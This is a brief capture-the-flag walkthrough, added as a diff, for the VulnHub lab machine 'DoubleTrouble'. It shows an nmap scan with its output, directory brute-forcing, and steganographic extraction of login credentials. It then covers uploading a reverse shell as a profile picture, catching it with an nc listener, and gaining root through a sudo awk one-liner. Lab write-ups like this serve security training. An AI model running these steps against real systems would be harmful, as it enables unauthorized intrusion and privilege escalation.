@@ -1,0 +1,59 @@
+Machine from https://www.vulnhub.com/entry/doubletrouble-1,743/
+###########PORT SCANNING#############
+nmap -sV -A -Pn 192.168.1.16 -o scan
+output:
+# Nmap 7.92 scan initiated Sun Oct  3 13:47:54 2021 as: nmap -sV -A -Pn -o scan 192.168.1.16
+Nmap scan report for doubletrouble.station (192.168.1.16)
+Host is up (0.070s latency).
+Not shown: 998 closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
+|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
+|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: qdPM | Login
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct  3 13:48:02 2021 -- 1 IP address (1 host up) scanned in 8.21 seconds
+
+##############DIRECTORY BRUTE#############################
+dirb http://192.168.1.16 -w ~/seclists/Discovery/Web-Content/common.txt
+we found: /secret
+
+wget http://192.168.1.16/secret/doubletrouble.jpg
+stegseek doubletrouble.jpg /usr/share/wordlists/rockout.txt -xf output
+cat output:
+otisrush@localhost.com
+otisrush666
+
+login with credentials on <your box ip>
+
+upload areverse shell as profile picture
+#########################access#####################
+connect to http://<yourboxip>/users/uploads/
+open your shellfile uploaded as profile picture
+nc -lnvp <port> on attacker
+
+got shell! 
+###################privesc####################
+
+$ sudo -l
+Matching Defaults entries for www-data on doubletrouble:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on doubletrouble:
+    (ALL : ALL) NOPASSWD: /usr/bin/awk
+$ 
+
+we can run awk as sudo.
+By GTFOBins run:
+sudo awk 'BEGIN {system("/bin/sh")}'
+
+GOT ROOT!
+
+
+
